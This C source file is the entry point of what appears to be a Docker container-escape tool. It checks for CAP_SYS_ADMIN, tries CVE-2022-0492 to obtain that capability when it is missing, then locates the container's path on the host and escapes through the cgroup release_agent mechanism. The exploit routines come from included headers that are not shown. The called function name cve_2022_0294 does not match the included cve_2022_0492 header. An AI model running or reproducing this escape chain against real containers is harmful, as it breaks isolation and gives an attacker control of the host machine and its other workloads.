#define _GNU_SOURCE

#include "docker/capability.h"
#include "payloads/cve_2022_0492.h"
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include "util/output.h"
#include "docker/path.h"
#include "payloads/release_agent.h"
#include <stdio.h>

int main() {
    srand(time(NULL));
    int sys_admin = check_cap_sys_admin();
    if (sys_admin == 0) {
        printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
        int result = cve_2022_0294();
        if (result == 0) {
            return 0;
        } else {
            printf_wrapper(INFO, "Try to get container path in host\n");
            char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
            get_container_path_in_host(container_path_in_host);
            escape_by_release_agent(container_path_in_host);
        }
    } else {
        printf_wrapper(INFO, "Try to get container path in host\n");
        char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
        memset(container_path_in_host, 0x00, 1024 * sizeof(char));
        get_container_path_in_host(container_path_in_host);
        escape_by_release_agent(container_path_in_host);
    }
}
